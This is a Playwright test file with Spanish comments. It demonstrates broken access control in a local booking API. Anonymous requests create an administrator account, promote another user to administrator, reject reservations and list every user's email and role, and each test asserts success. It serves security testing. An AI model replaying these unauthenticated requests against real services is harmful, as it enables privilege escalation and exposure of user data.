const { test, expect } = require('@playwright/test');

test.describe('Vulnerabilidades de usuarios - Julio Viche', () => {

  test('Crear un usuario con rol ADMINISTRADOR sin autenticación (escalada de privilegios)', async ({ request }) => {
    const unique = Date.now();
    const email = `admin-falso-${unique}@reservas.com`;

    // Petición totalmente anónima (sin Authorization) que crea un usuario
    // asignándole directamente el rol ADMINISTRADOR. La configuración de
    // seguridad debería rechazar la creación de administradores fuera del
    // módulo /api/admin, pero no hay filtro que lo impida.
    const createRes = await request.post('http://127.0.0.1:8080/api/usuarios', {
      data: {
        nombre: 'Atacante Anonimo',
        email: email,
        password: 'Password1!',
        rol: 'ADMINISTRADOR',
        telefono: '0977777777',
        departamento: 'TI',
        activo: true
      }
    });

    expect(createRes.ok()).toBeTruthy();
    const creado = await createRes.json();
    expect(creado.email).toBe(email);
    expect(creado.rol).toBe('ADMINISTRADOR');
  });

  test('Promover un usuario a ADMINISTRADOR sin autenticación (escalada de privilegios)', async ({ request }) => {
    const unique = Date.now();
    const emailVictima = `victima-${unique}@reservas.com`;

    // Primero se crea la víctima como CLIENTE (esto ya de por sí no debería
    // permitirse anónimamente, pero la app lo permite).
    const createRes = await request.post('http://127.0.0.1:8080/api/usuarios', {
      data: {
        nombre: 'Usuario Victima',
        email: emailVictima,
        password: 'Password1!',
        rol: 'CLIENTE',
        telefono: '0966666666',
        departamento: 'Atención',
        activo: true
      }
    });
    expect(createRes.ok()).toBeTruthy();
    const victima = await createRes.json();
    const idVictima = victima.idUsuario;

    // Ahora un atacante, sin identificarse, le cambia el rol a ADMINISTRADOR.
    const updateRes = await request.put(`http://127.0.0.1:8080/api/usuarios/${idVictima}`, {
      data: {
        nombre: 'Usuario Victima',
        email: emailVictima,
        password: '',
        rol: 'ADMINISTRADOR',
        telefono: '0966666666',
        departamento: 'Atención',
        activo: true
      }
    });

    expect(updateRes.ok()).toBeTruthy();
    const actualizado = await updateRes.json();
    expect(actualizado.rol).toBe('ADMINISTRADOR');
  });

  test('Rechazar una reserva sin autenticación (acción sensible sin control de acceso)', async ({ request }) => {
    const unique = Date.now();

    // Crear una reserva cualquiera para tener un id válido.
    const createRes = await request.post('http://127.0.0.1:8080/api/reservas', {
      data: {
        nombre: 'Cliente Rechazo',
        telefono: '0955555555',
        email: `rechazo${unique}@correo.com`,
        idServicio: 1,
        fecha: '2026-09-15',
        hora: '14:00:00',
        observaciones: 'Reserva para prueba de rechazo'
      }
    });
    expect(createRes.ok()).toBeTruthy();
    const reserva = await createRes.json();
    const id = reserva.idReserva;

    // Cualquiera (sin Authorization) puede marcar una reserva como Rechazada.
    const rejectRes = await request.put(`http://127.0.0.1:8080/api/reservas/${id}/rechazar`);
    expect(rejectRes.ok()).toBeTruthy();
    const rechazada = await rejectRes.json();
    expect(rechazada.estado).toBe('Rechazada');
  });

  test('Listar todos los usuarios sin autenticación (enumeración de cuentas)', async ({ request }) => {
    // Petición anónima contra /api/usuarios: además de confirmar que la ruta
    // está abierta, demuestra que un atacante puede enumerar la base completa
    // de usuarios (email, rol, departamento, etc.) sin credenciales.
    const res = await request.get('http://127.0.0.1:8080/api/usuarios');
    expect(res.ok()).toBeTruthy();
    const usuarios = await res.json();
    expect(Array.isArray(usuarios)).toBeTruthy();
    // Si el sistema expone al menos un usuario, la enumeración es trivial.
    if (usuarios.length > 0) {
      expect(usuarios[0]).toHaveProperty('email');
      expect(usuarios[0]).toHaveProperty('rol');
    }
  });

});
